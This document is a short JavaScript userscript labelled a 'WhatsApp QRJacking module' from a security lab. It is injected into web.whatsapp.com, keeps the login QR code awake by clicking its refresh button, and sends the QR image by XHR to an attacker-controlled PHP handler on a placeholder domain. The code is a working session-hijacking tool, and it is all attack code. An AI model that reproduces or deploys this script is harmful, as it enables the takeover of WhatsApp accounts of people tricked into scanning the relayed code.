// ==UserScript==
// @name        WhatsApp QRJacking module
// @namespace   Seekuritylabs (@Seekurity)
// The code will be injected in web.whatsapp.com web page and periodically searching for the element which holds the 
// QR Code image then will perform an XHR request to send this QR image code "base64" code to our server side php script
// which is responsible for converting and storing this "base64 code" to an image file. Also the code is responsible to 
// wake WhatsApp’s QR Code if it is inactive and needs the attacker's interaction to reload it.
// ==/UserScript==

var myTimer;
myTimer = window.setInterval(loopForQR, 3000);
function loopForQR() {
  if (document.readyState == 'complete') {
    $service = window.location.href;
    if ($service.indexOf('web.whatsapp.com') >= 0)
    {
      //Do some clicks to refresh the qr code if went inactive - Always wakeup the qrcode, Never sleep :D
      if (document.getElementsByClassName('qr-button')[0] !== undefined)
      {
        document.getElementsByClassName('qr-button')[0].click();
      }
      //Checking the availability of the qr code - in our example If WhatsApp is not logged in send us the qr code, If not, Do not exhaust our server with false qr code update requests;
      if (document.getElementsByClassName('icon icon-chat')[0] == null)
      {
        //Mirror the QR Code to our server
        var xhttp = new XMLHttpRequest();
        xhttp.open('GET', 'https://www.Your_Domain.com/QRHandler.php?c=' + document.getElementsByTagName('img')[0].src, true);
        xhttp.send();
      }
    }
  }
}
